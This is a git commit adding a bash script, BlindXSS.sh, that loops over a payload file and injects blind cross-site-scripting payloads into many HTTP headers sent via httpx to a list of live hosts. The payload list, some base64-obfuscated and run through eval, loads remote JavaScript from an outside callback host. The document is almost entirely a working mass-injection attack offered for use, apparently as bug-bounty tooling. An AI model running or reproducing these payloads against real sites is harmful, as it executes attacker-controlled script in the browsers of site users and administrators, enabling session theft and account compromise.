dfaa605c7d424c02ec2fad49b201ce2cb3a15799
vijay922 <31618850+vijay922@users.noreply.github.com>
2023-05-28 02:05:47 +0530

    Create BlindXSS.sh

---
+++ BlindXSS.sh
@@ -0,0 +1,27 @@
+while read bxss;do
+
+	cat alivehosts.txt | httpx \
+    	-H "X-Forwarded-for: $bxss" -H "X-forwarded-ip: $bxss" -H "cf-connecting-ip: $bxss"
+	
+    cat alivehosts.txt | httpx \
+    	-H "X-Client-ip: $bxss" -H "X-real-ip: $bxss" -H "X-request-uri: $bxss" \
+    	-H "X-XSRF-TOKEN: $bxss" -H "X-CSRF-TOKEN: $bxss"
+
+done < bxss-payload.txt
+
+
+file: bxss-payload.txt
+======================
+"><script>$.getScript("//js.rip/vijay922")</script>
+"><script src="https://js.rip/vijay922"></script>
+{{constructor.constructor('import("http://js.rip/vijay922")')()}}
+"><img src=https://js.rip/vijay922/${{7*7}}.jpg
+<img/src=https://js.rip/vijay922>
+<object data=data:text/html;base64,Ij48aW1nIHNyYz0vL2pzLnJpcC92aWpheTkyMj4=></object>?
+"><script src=https://js.rip/vijay922/"></script>");
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/vijay922\';document.body.appendChild(a)')
+";eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/vijay922\';document.body.appendChild(a)')
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3ZpamF5OTIyIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw autofocus>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3ZpamF5OTIyIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3ZpamF5OTIyIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw>
+<script>$.getScript("https://js.rip/vijay922")</script>
